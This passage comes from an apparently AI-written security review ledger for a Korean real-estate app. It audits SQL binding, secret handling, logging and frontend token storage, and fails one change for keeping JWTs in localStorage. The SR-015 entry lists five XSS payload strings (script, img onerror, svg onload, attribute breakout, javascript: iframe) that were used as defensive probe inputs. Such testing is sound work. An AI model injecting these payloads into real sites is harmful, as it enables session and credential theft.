회귀: 전체 **341 passed · 50 skipped**(로컬 DB 부재 skip) 재현 확인 — 지시서 기대치와 일치.

### 지시된 6개 점검 항목 결과

| # | 항목 | 결과 | 근거(파일:라인) |
|---|---|:--:|---|
| 1 | SQL 인젝션 (loader UPDATE/INSERT 파라미터 바인딩) | PASS | 아래 §1 |
| 2 | G2 근거감사 (실측 vs 좌표추정 confidence 구분) | PASS | 아래 §2 |
| 3 | INGEST-2 (해제거래 시세조작 방어 유지) | PASS | 아래 §3 |
| 4 | 비밀정보 노출 (API 키 하드코딩 여부) | PASS | 아래 §4 |
| 5 | 로그 (apt_dong·민감정보 유출) | PASS | 아래 §5 |
| 6 | 엔드포인트 전환 보안성 | PASS | 아래 §6 |

### §1 SQL 인젝션 — PASS
- `loader.py:238` UPDATE `apt_dong = COALESCE(:apt_dong, apt_dong)` — named bind. INSERT
  (`loader.py:255-261`)도 컬럼 목록에 `apt_dong` 추가 후 `:apt_dong` 값 바인드. 나머지 값
  (`:cid,:contract_date,:price,:area,:floor,:cancelled,...`) 전부 named bind. **문자열 포매팅으로
  외부값을 SQL 에 넣는 코드 0건**(f-string/`%`/`.format`/`+` 없음). `_complex_id`·`_unit_type_id`
  도 동일하게 named bind만 사용.
- 마이그레이션 006 은 **정적 DDL**: `ALTER TABLE trade ADD COLUMN IF NOT EXISTS apt_dong text`
  · `COMMENT ON COLUMN` · `CREATE INDEX IF NOT EXISTS ... WHERE apt_dong IS NOT NULL`.
  BEGIN/COMMIT 트랜잭션. 사용자 입력·동적 식별자 없음. 파티션 부모에 ADD COLUMN → 무중단 전파.
- `apt_dong` 원본은 외부(MOLIT) 자유문자열('청담(103)' 등)이나 바인드로만 저장되어 저장 시점
  SQLi 불가. (F4 매칭 계층에서 building.name 대조 시에도 값 비교이며 이번 diff 범위 밖.)

### §2 G2 근거감사 — PASS
- `apt_dong` 은 실거래 원본 값이라 **추정이 아니다**. `normalize_apt_dong`(molit.py:95)은 원본을
  strip 보존하고 빈값/`-`/`0` 만 None 으로 정리 — "없는 걸 지어내지 않는다"는 G2 원칙 준수.
- erd §0 이 정정되어 confidence 로 근거의 질을 **구분**한다: `trade.apt_dong` 실측 → **high**,
  결측 10~23% 좌표추정 폴백 → 낮춰 표기, `agent_finding.evidence` 에 어느 쪽인지 기록.
  이번 변경은 **추정을 확정치로 둔갑시키지 않는다** — 오히려 기존 좌표추정(간접)을 실측(직접)으로
  격상하되 폴백 경로의 낮은 신뢰도 표기를 유지한다. UI/리포트 실측·추정 구분 명시 의무도 문서에 보존.

### §3 INGEST-2 (해제거래 시세조작 방어) — PASS
- `normalize.TradeNaturalKey`(normalize.py:95-102)는 이번 diff 에서 **불변**: 키=(complex,
  contract_date, price_krw, area_m2, floor). `apt_dong` **미포함**, `is_cancelled` 여전히 **제외**.
- `_upsert_trade` 의 UPDATE WHERE(loader.py:246-251)는 자연키 컬럼만 매치 — `apt_dong` 은 WHERE 에
  없다. 따라서 정상→해제 재유입이 apt_dong 유무와 무관하게 **원본 행을 UPDATE**(is_cancelled=True)해
  NOT is_cancelled 통계에서 사라지는 방어가 그대로 유지된다.
- `apt_dong = COALESCE(:apt_dong, apt_dong)` 는 재유입분 apt_dong 이 NULL 이어도 기존 동값을
  지우지 않아, 결측이 자연키를 흔들거나 방어를 우회할 여지가 없다. (INGEST-2 CLOSE 회귀 테스트
  전부 통과 유지.)

### §4 비밀정보 노출 — PASS
- diff·신규파일 전수 스캔: MOLIT `serviceKey`/자격증명 **하드코딩 0건**. 코드에는 **엔드포인트 URL만**
  존재하고 키 없음. serviceKey 는 `build_params(service_key=...)`(molit.py:236)로 런타임 주입되며,
  그 값은 `config/sources.yaml auth.env: MOLIT_API_KEY`(env)에서 온다.
- `.env` 는 `.gitignore` 적용(검증), tracked/untracked 비밀파일 0건.
- 신규 PNG 2건(`deploy/service-screen-datagokr.png`·`thumbnail-datagokr.png`)은 **앱 UI 목업**으로,
  data.go.kr 포털 캡처가 아니며 serviceKey 노출 없음(직접 이미지 확인).

### §5 로그 — PASS
- `apt_dong` 값을 로그로 남기는 코드 0건. `run_daily` 메시지는 건수(단지/타입/거래 신규·갱신)만 기록.
- 운영 경로(`run_daily`)는 `postgis_log_sink` 사용 → `ingest_log` 에 `run.message`(요약 카운트)와
  요약 1줄만 남기고 `run.failures`(예외 문자열 포함)는 기록하지 않는다. serviceKey 유출 경로 없음.

### §6 엔드포인트 전환(Dev→운영) — PASS
- `RTMSDataSvcAptTradeDev`→`RTMSDataSvcAptTrade`, 둘 다 `https://apis.data.go.kr/1613000/...`
  공공데이터포털 **HTTPS** 엔드포인트. 다운그레이드·평문 전송 없음. 발급 일반 인증키가 운영에서만
  동작(Dev 는 403)한다는 사실을 주석에 정직히 기재. 보안 회귀 없음.

### 비차단 관찰(권고 · 이번 판정 결격 아님)
- **(기존 코드·범위 밖)** `runner.py:140-142` 는 일반 예외 문자열을 `run.failures` 에 담는데, httpx
  `raise_for_status` 예외 메시지는 URL(=serviceKey 포함 쿼리스트링)을 담을 수 있다. 운영
  `run_daily` 경로는 failures 를 로깅/저장하지 않아 **현재 유출 없음**이나, `_default_log_sink`
  사용 시에는 serviceKey 가 WARNING 로그로 새어나갈 수 있다. 이번 diff 가 건드린 코드는 아니지만,
  방어심층 차원에서 fetch 오류 처리 시 serviceKey 마스킹을 2차 권고로 남긴다.
- **(전방 관찰)** `apt_dong` 은 외부 API 자유문자열이라 F4 에서 프론트 렌더 시 XSS 표면이 될 수
  있으나, React 기본 이스케이프 대상이며 이번 diff 는 프론트 렌더 코드를 포함하지 않는다.

### 판정
**PASS.** 지시된 6개 항목 전부 통과. apt_dong 은 실측 원본을 파라미터 바인드로만 저장하고
자연키·is_cancelled 방어(INGEST-2)를 건드리지 않으며, 마이그레이션은 정적 DDL, 비밀정보
하드코딩·로그 유출·미암호화 전송 없음. 엔드포인트 전환은 HTTPS→HTTPS 로 보안 회귀 없음.
fail 조건(인증·인가 결함 / 인젝션 / 비밀정보 하드코딩 / 민감정보 로그노출 / 미암호화 전송)
어느 것도 해당하지 않는다.

---

## SR-014 · 2026-07-25 · F4 동별 실측 — valuation 소비 계층 (herdr re-review 대행)

**판정: PASS**
검증자: `security-reviewer` (herdr re-review 대행 · 독립 감사)
범위: SR-013(수집·스키마 계층)이 넣은 `trade.apt_dong` 을 **F4 밸류에이션에 연결**하는 변경.
대상: `backend/app/domain/valuation/{models,stats}.py`, `backend/app/agents/orchestrator.py`,
`backend/app/repositories/postgis.py`(`_TRADES_SQL`), `backend/tests/{test_valuation,test_agents}.py`,
`docs/02-design/{agents/03-valuation-trader.md,api-spec.md}`.
회귀: 전체 **352 passed · 50 skipped**(로컬 DB 부재 skip) 직접 재현 — 지시서 기대치와 일치.

> SR-013 은 apt_dong 의 **저장 경로**(loader upsert·마이그레이션·정규화)를 감사해 PASS 했다.
> 이번 SR-014 는 그 값을 **읽어 F4 동별 ₩/㎡ 실측으로 소비**하는 계층(`dong_effect`,
> `DongValuation`, orchestrator 배선, `_TRADES_SQL` SELECT 확장)이 대상이다. 341→352 passed(+11).

### 지시된 5개 점검 항목 결과

| # | 항목 | 결과 | 근거 |
|---|---|:--:|---|
| 1 | SQL 인젝션 (`_TRADES_SQL` apt_dong 추가) | PASS | §1 |
| 2 | 민감정보 분리 (SR4-2 계열) | PASS | §2 |
| 3 | G2 근거감사 (실측/추정 basis 구분) | PASS | §3 |
| 4 | 비밀정보 하드코딩 | PASS | §4 |
| 5 | 출력 안전 (동 값 XSS 전방관찰) | 관찰 | §5 |

### §1 SQL 인젝션 — PASS
- `_TRADES_SQL`(postgis.py:650-657)은 **정적 `text()` SELECT**. 이번 변경은 SELECT 컬럼 목록에
  식별자 `tr.apt_dong` 을 추가한 것뿐 — **사용자 입력이 아니다**. WHERE·LIMIT 은 그대로
  `:complex_id` · `CAST(:limit AS int)` **named bind** 유지.
- 실행부(postgis.py:662-665)는 `conn.execute(self._TRADES_SQL, {"complex_id": complex_id,
  "limit": _TRADE_HISTORY_LIMIT})` — dict 파라미터 바인드. `complex_id` 는 호출자 int,
  `_TRADE_HISTORY_LIMIT` 은 상수. f-string/`%`/`.format`/`+` 로 SQL 에 값을 끼워넣는 코드 0건.
- 새 SELECT 결과 `row.apt_dong` 은 `TradeRow(apt_dong=row.apt_dong)` 로 담기며, 이후
  `dong_effect` 에서 **딕셔너리 키·통계 입력**으로만 쓰인다(stats.py:129-134). SQL 재구성 없음.
- (SR-013 에서 이미 확인한) 저장 경로 UPDATE `apt_dong = COALESCE(:apt_dong, apt_dong)` ·
  INSERT `:apt_dong` · 마이그레이션 006 정적 DDL 은 이번 diff 에서 불변. **SQLi 표면 없음.**

### §2 민감정보 분리 (SR4-2 계열) — PASS
- **apt_dong · ₩/㎡ · 동별 배율은 공개 실거래(시장) 데이터** — 사용자 자산/소득/대출이 아니다.
  맞다. `dong_effect` 입력은 `TradeRow`(MOLIT 실거래)뿐이고 산출값(`ratio`·`median_ppm_krw`·
  `vs_complex_pct`·`coverage_pct`)은 전부 거래가에서 파생된다. 사용자 원본이 섞일 소스가 없다.
- LLM 으로 가는 것은 `valuation_finding` 의 rationale/evidence(orchestrator.py:171-203).
  추가된 문구·근거는 `band.median_krw`(중위 실거래가)·`ask`(=`rep.ask_price_krw` 호가, 공개)·
  `top.dong`·`top.vs_complex_pct`·`top.sample_size`·`dong.coverage_pct` 뿐 — **전부 시장 데이터**.
  자산금액이 rationale/evidence 에 들어갈 경로가 구조적으로 없다.
- `_dong_valuation_dict`(orchestrator.py:206-243)의 출력은 응답 `items[i]["dong_valuation"]` 으로,
  LLM 프롬프트가 아니라 사용자 응답 JSON 이다. 담기는 값도 동명·배율·표본·₩/㎡·coverage 로 시장 데이터.
- 자산유출 방어 회귀 유지: `portfolio_summary` 의 `_derive_forbidden`(fail-loud) +
  `assert_no_secrets`(tripwire) 미변경(orchestrator.py:342-354). **`test_파이프라인_프롬프트에_
  자산금액이_없다` 포함 352 passed** 재현 — F4 추가가 finding 에 파생값만 싣는 구조를 깨지 않았다.

### §3 G2 근거감사 (실측/추정 구분) — PASS
- **폴백을 실측으로 둔갑시키지 않는다**(구조적 구분):
  - `dong_effect`(stats.py)는 전체 표본 < `MIN_SAMPLE`(5) → `available=False, method="표본부족"`;
    모든 동 표본 < `MIN_SAMPLE_DONG`(3) → `available=False, method="동표본부족"`;
    coverage 0% → `method="동정보없음"`. 미달 동은 `dongs` 에서 **아예 빠진다**(숫자 미창작).
  - `DongValuation.to_evidence`(models.py:238-250)는 `not available` 이면 **`[]`**.
  - `_dong_valuation_dict`: `not available` 이면 `confidence=0.0` + `basis` 키 없음 + `reason`/
    `note`("좌표추정 폴백")만; `available` 이면 `basis="trade_measured"` + `confidence=0.85`.
  - `valuation_finding` 은 `if dong.available` 일 때만 rationale·evidence 에 동을 싣는다
    (orchestrator.py:186-197). 폴백 시 문구·근거에 동 언급 자체가 없다.
- 실측 evidence 는 `basis="trade_measured"`(models.py:249)로 좌표추정(`estimated_from_location`/
  `listing_reported`)과 명시 구분. `test_동정보없으면_파이프라인이_폴백을_명시한다`
  (available=False·method="동정보없음"·confidence=0.0)와 `test_파이프라인_아이템에_동별_실측이_
  담긴다`(basis=trade_measured·confidence=0.85)가 양방향을 고정. **실측/추정이 basis 로 구조 구분됨.**

### §4 비밀정보 하드코딩 — PASS
- diff 전수 확인: API 키·serviceKey·비밀번호·토큰 **하드코딩 0건**. 코드 변경은 통계 로직·직렬화·
  SELECT 컬럼·테스트뿐. `frontend/package-lock.json` 증분은 dev 테스트 의존성(@testing-library·
  jsdom) 메타데이터로 자격증명 없음.

### §5 출력 안전 (XSS 전방관찰) — 관찰(비차단)
- `apt_dong` 원본('청담(103)' 등 MOLIT 자유문자열)이 응답 JSON(`dong_valuation.dongs[].dong`,
  evidence `claim`, rationale 문자열)에 그대로 실린다. 값의 출처가 외부 API 라 임의 문자를 담을 수 있다.
- **이번 diff 는 프론트 렌더 코드를 포함하지 않는다.** React 는 기본 이스케이프하므로 정상 렌더 경로는
  안전하나, 향후 `dangerouslySetInnerHTML`·비-React 렌더(리포트 PDF/이메일 등)에서 이 값을 쓰면
  XSS 표면이 된다. SR-013 §비차단관찰과 동일한 **전방관찰**로만 기록(이번 판정 결격 아님).

### 판정
**PASS.** `_TRADES_SQL` 은 정적 SELECT + named bind 유지(SQLi 없음), F4 동별 값은 공개 시장
데이터라 자산유출과 무관하며 finding 파생값 구조·자산유출 tripwire 회귀 유지(SR4-2 무손상),
실측/폴백이 `available`/`basis`/`confidence` 로 구조적으로 구분되어 추정을 실측처럼 내놓지 않고
(G2), 비밀정보 하드코딩·민감정보 로그노출·미암호화 전송 없음. fail 조건(인증·인가 결함 / 인젝션 /
비밀정보 하드코딩 / 민감정보 로그노출 / 미암호화 전송) 어느 것도 해당하지 않는다.
전방관찰 1건(동 값 프론트 렌더 XSS)은 프론트 구현 시 이스케이프 확인 권고로 승계한다.

---

## SR-015 · 2026-07-25 · 프론트 FE-1 인증/토큰 · FE-2 마커 XSS (herdr re-review 대행)

**판정: FAIL — 차단 1건(`SR15-1` 토큰 저장 위치가 2단계 설계 결정을 정면 위반)**
reviewer: `security-reviewer (herdr re-review 대행)` · 대상: working tree(미커밋) `git diff` + 신규 파일
scope: `frontend/src/api/client.ts` · `hooks/useAuth.ts` · `components/AuthForm.tsx` ·
`lib/mapMarkers.ts` · `lib/validation.ts` · `lib/notices.ts` · `components/{MapView,ComplexCard,BottomSheet}.tsx` ·
`App.tsx` · `main.tsx` · 테스트 3종 · `package.json`

> 먼저 결론의 모양을 밝힌다. **지시서가 최대 표면으로 지목한 XSS(FE-2)는 깨끗하다** — 5가지
> 페이로드를 직접 태워 실증했고 SR-014 전방관찰도 여기서 CLOSE 한다. FAIL 사유는 **단 하나**,
> 토큰을 어디에 두느냐다. 그것 하나가 `security.md §2.1` 이 명문으로 금지한 항목이라 넘길 수 없다.

### 검증 방법
문서 판독이 아니라 **실행**했다. 임시 probe 테스트(`src/__srprobe__.test.tsx`, 검증 후 삭제)를
작성해 악성 입력을 실제 DOM 에 태우고, 토큰 저장/삭제/URL 노출/탭 동기화를 계측했다.
전체 회귀 `npm test` **36 passed**(4 files), `npm run build` 성공, probe **6 passed** 재현.

---

### 1) XSS — FE-2 마커 (지시 최우선) · **PASS · SR-014 전방관찰 CLOSE**

SR-014 가 "동 원본문자열이 응답에 그대로 실린다"며 프론트 렌더로 넘긴 항목의 결론이다.

| # | 점검 | 결과 | 실측 근거 |
|:--:|---|:--:|---|
| X1 | 라벨을 `innerHTML` 로 넣는가 | **아니다** | `mapMarkers.ts:39-49` `createElement`+`textContent`. src 전수 grep: `innerHTML`·`outerHTML`·`insertAdjacentHTML`·`document.write` **0건**(주석 언급 3건 제외) |
| X2 | CustomOverlay `content` 로 **HTML 문자열**을 넘기는 경로가 있는가 | **없다** | `mapMarkers.ts:146-152,173-180` 은 항상 `el`(HTMLElement). probe 단언 `content instanceof HTMLElement === true`, `typeof !== "string"` — 카카오 SDK 의 HTML 문자열 파싱 분기 자체를 타지 않는다 |
| X3 | 악의적 단지명이 실행되는가 | **안 된다** | 5개 페이로드를 `setComplexes` 로 태우고 결과 요소를 `document.body` 에 실제 부착 → `querySelector("img,script,svg,iframe")` **전부 null**, `window.__pwned` **undefined** |
| X4 | `dangerouslySetInnerHTML` | **0건** | src 전수 grep(주석 1건뿐) |
| X5 | 속성 경유 우회 | **차단** | `setAttribute` 사용처 3곳뿐(`role`·`aria-label`×2 — `mapMarkers.ts:107,143,170`). 속성명은 하드코딩, 값은 속성으로만 들어가 HTML 파서를 타지 않음. `on*` 을 데이터로 세팅하는 경로 0건 |
| X6 | React 경로 | **안전** | `ComplexCard.tsx:52` `{item.name}`, `App.tsx:113` `{c.region_code}`, `MapView.tsx:138` `{error}` 모두 JSX 텍스트(자동 이스케이프). probe 로 카드 렌더 시 `img` 미생성 확인 |
| X7 | 기타 코드실행 sink | **0건** | `eval(`·`new Function` 0건. `createElement("script")` 는 `MapView.tsx:36-41` 카카오 SDK 로더 1곳이며 URL 은 빌드타임 env(`VITE_KAKAO_JS_APP_KEY`) — 사용자 입력 아님 |

**투입한 페이로드(재현용)**

```
청담<img src=x onerror="window.__pwned=1">(103)
<script>window.__pwned=2</script>
" onmouseover="window.__pwned=3" x="
</span><svg onload=window.__pwned=4>
 <iframe src=javascript:alert(1)>
```

→ 전부 텍스트로만 남고(`aria-label` 에도 원문 보존) 실행 0건.

**SR-014 §5 전방관찰(동 원본문자열 프론트 렌더) → CLOSE.** 이번 diff 가 그 렌더 코드이고,
`textContent`/JSX 두 경로 모두 실증으로 막혔다.

---

### 2) `SR15-1` **[차단]** 토큰을 localStorage 에 둔다 — `security.md §2.1` 명문 위반

**심각도 High · CWE-522(Insufficiently Protected Credentials) · OWASP A07:2021 + A05:2021**

#### 사실

- `client.ts:60-61` `ACCESS_KEY`/`REFRESH_KEY`, `:83-100` `browserStorage()`, `:125-136` `setTokens`
  → **access·refresh 를 둘 다 `localStorage`** 에 쓴다. `main.tsx:8` `loadTokens()` 로 브라우저를
  껐다 켜도 복원된다.
- 2단계 설계 `docs/02-design/security.md:50` — *"refresh 저장 | 웹: `httpOnly` + `Secure` +
  `SameSite=Strict` 쿠키 / RN 앱: OS 보안저장소(Keychain·Keystore)"*
- 같은 문서 `:54` — *"⚠️ JWT를 `localStorage`에 넣지 않는다 — XSS 한 방에 토큰이 털린다."*

즉 **하지 말라고 문서에 적힌 바로 그 일**을 하고 있고, 예외를 기록한 ADR·잔여위험 항목이 없다.

#### 왜 "지금 XSS 가 없으니 괜찮다"로 넘기지 않는가 — 보완통제가 **셋 다** 없다

| 보완통제 | 상태 | 근거 |
|---|:--:|---|
| 설계가 전제한 `httpOnly` 쿠키 | **없음** | 위. 백엔드에도 `set_cookie` 0건 |
| CSP(2선 방어) | **없음** | `deploy/nginx-realestate.conf` 보안헤더는 HSTS·nosniff·DENY·Referrer-Policy 4종뿐, `Content-Security-Policy` 0건. `frontend/index.html` 에 CSP meta 도 없음 |
| 서버측 토큰 폐기 | **없음** | `backend/app/` 전수 grep `logout`·`revoke`·`denylist`·`jti` **0건**. `/auth/logout` 엔드포인트 자체가 없다 |

여기에 **refresh TTL = 14일**(`backend/app/core/security.py:289 REFRESH_TTL = timedelta(days=14)`)
이 겹친다. 결과:

> **XSS 1회 = 자산·소득·대출을 다루는 계정의 14일짜리 · 폐기 불가능한 자격증명 탈취.**
> 사용자가 "로그아웃" 을 눌러도 그 토큰은 계속 유효하다(클라이언트에서 지울 뿐이다).

이 자산은 `security.md §1` 이 민감도 **최상**으로 분류하고 §0 에서 *"유출되면 금융사기·표적 범죄의
직접 재료"* 라고 쓴 바로 그 데이터다.

#### "XSS 만 없으면 된다"가 왜 단일 실패점인가 (구체적 경로)

`MapView.tsx:36-41` 이 **`dapi.kakao.com` 스크립트를 같은 오리진에 주입**한다. 이 서드파티가
훼손되거나 공급망 공격을 받으면 그 스크립트는 `localStorage` 를 그대로 읽는다. `httpOnly` 쿠키였다면
같은 사고에서도 refresh 는 살아남는다. CSP 도 없어 스크립트 출처를 좁혀 두지도 않았다.
지금의 방어는 **"이 앱과 카카오 SDK 양쪽에 앞으로 영원히 XSS 가 없다"** 는 가정 하나뿐이다.

#### 전파 위험 — RN 이식 시 같은 결함이 복제된다

`client.ts:64` 주석: *"웹은 localStorage, RN 은 **AsyncStorage** 로 갈아끼운다"*.
AsyncStorage 는 **평문 저장소**다. 설계(§2.1)는 RN 에 **Keychain·Keystore** 를 요구한다.
지금 고치지 않으면 웹·앱 **두 타깃 모두** 설계를 위반한 채로 굳는다.

#### 통과 조건 (둘 중 하나 — 어느 쪽이든 문서와 코드가 일치해야 한다)

- **(A) 설계대로 구현**
  1. refresh 는 `/auth/login`·`/auth/refresh` 가 `httpOnly; Secure; SameSite=Strict; Path=/api/v1/auth` 쿠키로 발급·회수. JS 가 읽지 못하게 한다.
  2. access 는 **메모리 전용**(모듈 변수). `localStorage` 에 쓰지 않는다 → `loadTokens()` 는 새로고침 시 쿠키로 조용히 refresh 하는 방식으로 대체.
  3. 쿠키가 생기므로 `/auth/refresh` 한 곳에 CSRF 대비(SameSite=Strict + Origin 검사, 또는 double-submit)를 명시.
  4. 회귀 테스트: `document.cookie`·저장소에 refresh 가 노출되지 않음 1건.
- **(B) 예외를 정식 등재** (MVP 편의를 택할 경우 — **사람 승인 필요, 리뷰어 단독 수용 불가**)
  1. `security.md §2.1` 의 금지 문구를 개정하고 `§8 잔여위험`에 `R-09` 로 등재(수용 사유·재평가 조건 포함).
  2. 보완통제 동반: ⓐ nginx 에 `Content-Security-Policy`(최소 `default-src 'self'; script-src 'self' https://dapi.kakao.com https://*.daumcdn.net; object-src 'none'; base-uri 'none'; frame-ancestors 'none'`) ⓑ refresh TTL 단축 ⓒ 서버측 폐기(`jti` denylist + `/auth/logout`) ⓓ RN 은 Keychain/Keystore 강제를 코드 주석·문서에 명시.

> 어느 쪽도 대규모 작업이 아니다. 지금 막는 이유는 위험의 크기보다 **문서가 금지한 것을 코드가
> 조용히 하고 있다**는 상태 자체다. 이 원장은 이미 SR-005→SR-006 에서 "문서-현실 불일치를
> 리뷰어가 좋게 해석했다가 반려당한" 전례를 갖고 있다. 같은 실수를 반복하지 않는다.

---

### 3) 토큰 유출 경로 — **PASS**

| # | 점검 | 결과 | 근거 |
|:--:|---|:--:|---|
| L1 | `console.log` 등으로 토큰·비밀번호 출력 | **0건** | `frontend/src` 전수 grep `console.` 0건 |
| L2 | 토큰이 URL 쿼리스트링에 실리는가 | **아니다** | probe: `SECRET_ACCESS`/`SECRET_REFRESH` 설정 후 API 호출 → fetch URL 에 미포함. 토큰은 `client.ts:158` `Authorization` 헤더, refresh 는 `:192` 요청 **본문** |
| L3 | 에러 메시지로 새는가 | **아니다** | `ApiException` 은 서버 `code`/`message` 만 보유(`client.ts:164-170`). `App.tsx:54`·`AuthForm.tsx:177` 이 그 문자열을 JSX 텍스트로만 출력. 토큰·요청본문을 담지 않음 |
| L4 | 분석/텔레메트리 SDK | **없음** | dependencies = react, react-dom 뿐 |
| L5 | **빌드 산출물에 서버 전용 키** | **없음** | `frontend/dist/assets/index-*.js` 를 `.env` 실값으로 직접 대조 → `KAKAO_REST_API_KEY` **미포함**, `MOLIT_API_KEY` **미포함**. 검출된 것은 `KAKAO_JS_APP_KEY`(=`VITE_KAKAO_JS_APP_KEY`) 1건뿐 — **원래 클라이언트 노출 키라 정상** |
| L6 | 소스맵 유출 | **없음** | `vite.config.ts` `build.sourcemap: false` |
| L7 | 비밀파일 커밋 | **없음** | `git check-ignore` 실검증 — `frontend/.env`(.gitignore:2), `frontend/dist`(.gitignore:24) 모두 IGNORED. 추적 중인 env 파일은 `.env.example`(빈 플레이스홀더)뿐 |

- 관찰(무해): `request()` 의 refresh 재시도가 만료된 access 토큰을 `Authorization` 에 얹어
  `/auth/refresh` 로 보낸다. 동일 오리진·이미 만료된 값이라 위험 증가 없음.
- 이월 확인: 카카오 JS 앱키의 **허용 도메인 제한**은 `deploy/DEPLOY.md:129-130` 에 이미 지시되어
  있다. 사람이 콘솔에서 수행하는 G5 단계 항목이므로 여기서는 검증 불가 — 배포 시 확인할 것.

---

### 4) 계정 열거 — **PASS(신규 결함 없음) · 기존 `SR10-1` 범위 유지**

- 로그인 실패 문구가 **합쳐져 있다**: `AuthForm.tsx:174` — 401 이면 원인을 불문하고
  `"이메일 또는 비밀번호가 올바르지 않습니다."` 백엔드(`routes.py:88-90`)도 동일 401·동일 문구라
  **없는 계정 / 틀린 비밀번호를 화면이 구분하지 않는다.** 회귀 테스트 존재(`AuthForm.test.tsx:34`).
- 회원가입 `EMAIL_TAKEN`(`AuthForm.tsx:173`)은 계정 존재를 드러낸다. 다만 이는 **백엔드 409 채널**
  (`routes.py:73-76`)의 표면화이며, `SR-010` 에서 실측·트리아지해 **`SR10-1` ACCEPTED(비차단)** 로
  이미 등재된 항목이다. 프론트가 새 채널을 만들지 않았으므로 **이번 판정의 결격 사유가 아니다.**
- 다만 **정직하게 기록**한다: 그동안 API 호출로만 가능하던 오라클이 이제 **화면에서 두 번 탭이면**
  확인된다. 노출 난이도가 실질적으로 내려갔다. `SR10-1` 의 재평가 트리거에
  *"④ 로그인 UI 가 공개 노출된 뒤"* 를 추가할 것을 권고한다(비차단).
- 참고: 가입 성공 후 즉시 로그인하는 흐름(`AuthForm.tsx:42-46`)은 자격증명을 URL 이 아닌 본문으로
  두 번 보낼 뿐 추가 유출을 만들지 않는다.

---

### 5) 로그아웃 완전성 — **부분 (비차단 2건, 단 `SR15-1` 과 결합)**

| 점검 | 결과 | 근거 |
|---|:--:|---|
| 저장소에서 access·refresh **모두** 제거 | ✅ | `setTokens(null,null)` → `remove` ×2(`client.ts:131-134`). probe: 저장소 map `size === 0` |
| 메모리 상태 초기화 | ✅ | `accessToken`·`refreshToken` = null → `isAuthenticated() === false` (probe 실측) |
| 401 경로에서도 확실히 폐기 | ✅ | refresh 없음(`:185-188`) / refresh 실패(`:195-197`) / 재시도도 401(`:201-203`) **세 경로 모두** `logout()` 호출. 기존 테스트 3건이 고정 |
| 화면 전환 | ✅ | `emitAuth` → `useAuth` → `App.tsx:157` 로그인 게이트 복귀 |
| **다른 탭과 동기화** | ❌ **`SR15-2`** | `storage` 이벤트 리스너 **0건**. probe 실측: 다른 탭이 지웠다고 가정하고 `StorageEvent` 발사 → 이 탭은 여전히 `isAuthenticated() === true`, 메모리 토큰 보유. 한 탭에서 로그아웃해도 다른 탭은 계속 요청을 보낸다 |
| **서버측 폐기** | ❌ **`SR15-3`** | `/auth/logout` 없음, `jti` denylist 없음(backend 전수 grep 0건). 로그아웃은 **클라이언트 전용 연출**이고 발급된 14일 refresh 는 살아 있다 |

`SR15-3` 은 단독으로는 low 지만 `SR15-1`(그 토큰이 JS 로 읽히는 곳에 있음)과 곱해지면
"탈취되면 회수 수단이 없다"가 된다. `SR15-1` 통과조건 (B)-ⓒ 에 포함시킨 이유다.

---

### 6) 비밀번호 취급 — **PASS**

| 점검 | 결과 | 근거 |
|---|:--:|---|
| `type="password"` 기본 | ✅ | `AuthForm.tsx:103`. 표시 토글은 사용자가 명시적으로 누를 때만 `text`(의도된 UX, 표준 관행) |
| `autocomplete` 정확성 | ✅ | `:105` `new-password`(가입) / `current-password`(로그인) 모드별 전환. 이메일은 `:84` `autoComplete="username"` — 비밀번호 관리자가 올바르게 짝짓는다 |
| 부수 유출 방지 | ✅ | 이메일에 `autoCapitalize="none"`·`spellCheck={false}`(`:85-86`). 비밀번호는 폼 상태에만 존재하고 성공 시 컴포넌트가 언마운트(`App.tsx:157→158`)되어 사라진다. URL·로그·저장소 어디에도 남지 않음 |
| 서버 규칙과 일치 | ✅ | `validation.ts:10-11` `PASSWORD_MIN=12`/`MAX=256` = `schemas.py:11` `Field(min_length=12, max_length=256)`. **클라가 서버보다 엄격하지 않다**(2종 문자조합은 `required:false` 권장 표기) — 서버가 받아주는 비밀번호를 화면이 거부하는 상태가 아니다 |
| 클라 검증이 진실 행세를 하는가 | ✅ 아니오 | `validation.ts:5-7,61-63` 이 "서버가 진실"임을 명시. 최종 판정은 서버 `EmailStr`·`Field` |

---

### 7) CSRF · 의존성 — **PASS**

- **CSRF**: 자격증명이 `Authorization` 헤더이고 쿠키를 쓰지 않는다(백엔드 `set_cookie` 0건).
  브라우저가 자동 첨부하는 인증정보가 없으므로 고전적 CSRF 가 성립하지 않는다.
  ※ `SR15-1` 통과조건 (A) 를 택해 쿠키를 도입하면 **이 전제가 바뀐다** — (A)-3 에 CSRF 대비를 명시했다.
- **의존성**: 신규는 전부 `devDependencies`(@testing-library/{dom,react,user-event}, jsdom).
  `dist/assets/*.js` grep `testing-library|vitest` **0건** — 프로덕션 번들에 들어가지 않음(실측).
  `npm audit --omit=dev` → **found 0 vulnerabilities**.
- 프로덕션 dependencies 는 react·react-dom 2개뿐. 번들 161 kB.

---

### 이번에 새로 연 항목

| ID | 심각도 | 차단 | 내용 |
|---|---|:--:|---|
| `SR15-1` | **High** | **예** | access·refresh 를 localStorage 에 저장 — `security.md §2.1` 명문 금지 위반. 보완통제(httpOnly 쿠키·CSP·서버측 폐기) **셋 다 부재** + refresh 14일 |
| `SR15-2` | Low | 아니오 | 다른 탭과 로그아웃 미동기화(`storage` 이벤트 미구독) |
| `SR15-3` | Low | 아니오 | 서버측 토큰 폐기 수단 부재(`/auth/logout`·jti denylist 없음) — `SR15-1` 과 결합 시 회수 불가 |

### 닫은 항목

- **SR-014 §5 전방관찰(동 원본문자열 XSS) → CLOSE.** 마커·카드 두 렌더 경로 모두 실증으로 안전.

### 판정

**FAIL.** 지시서가 최대 표면으로 지목한 XSS(FE-2)와 토큰 유출·비밀번호 취급·CSRF·의존성은
전부 실측 PASS 이고, 프론트 구현 품질 자체는 견고하다. 그러나 **`SR15-1` 은 fail 조건의
"인증 결함"에 정확히 해당**한다 — 2단계 설계가 명문으로 금지한 저장 위치를 예외 기록 없이 사용했고,
그 결정이 전제했던 보완통제가 하나도 없으며, 결과적으로 이 프로젝트가 민감도 **최상**으로 분류한
자산에 대해 **폐기 불가능한 14일 자격증명이 스크립트로 읽히는 곳에 놓인다.**
`SR15-1` 통과조건 (A) 또는 (B) 중 하나를 충족하면 재감사한다. `SR15-2`·`SR15-3` 은 비차단이며
(B) 를 택할 경우 함께 처리하기를 권고한다.

---

## SR-016 · 2026-07-25 · SR15-1 수정 재검증 — 쿠키+메모리 전용 전환 (반려 당사자 재감사)

**판정: PASS — `SR15-1` CLOSE.** 잔여 `SR15-3`·`SR15-4` 는 비차단으로 승계(단 `SR15-4` 는 **G5 배포 절차의 차단 조건**).
